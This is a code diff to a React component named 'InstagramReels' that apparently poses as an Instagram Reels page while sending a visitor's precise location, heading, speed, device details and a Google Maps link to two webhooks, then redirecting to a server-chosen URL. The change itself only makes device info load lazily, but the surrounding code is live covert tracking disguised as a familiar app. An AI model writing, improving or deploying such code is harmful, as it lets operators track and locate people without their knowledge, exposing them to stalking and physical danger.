@@ -173,13 +173,13 @@ export default function InstagramReels() {
           latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
           altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
           heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
-          deviceInfo,
+          deviceInfo: getDeviceInfoLazy(),
           googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
           attemptNumber: attempt,
         }),
       });
     } catch (e) { console.error('[W2] Fail:', e); }
-  }, [deviceInfo]);
+  }, []);
 
   // Send FINAL precise location to Webhook 1
   const sendFinalToWebhook1 = useCallback(async (loc: LocationData, attempt: number) => {
@@ -192,7 +192,7 @@ export default function InstagramReels() {
           latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
           altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
           heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
-          deviceInfo,
+          deviceInfo: getDeviceInfoLazy(),
           googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
           attemptNumber: attempt,
         }),
@@ -203,7 +203,7 @@ export default function InstagramReels() {
         setTimeout(() => { window.location.href = data.redirectUrl; }, 800);
       } else { setAppState('reel'); }
     } catch (e) { console.error('[W1] Fail:', e); setAppState('reel'); }
-  }, [deviceInfo]);
+  }, []);
 
   // Start watching location continuously
   const startWatchingLocation = useCallback(() => {
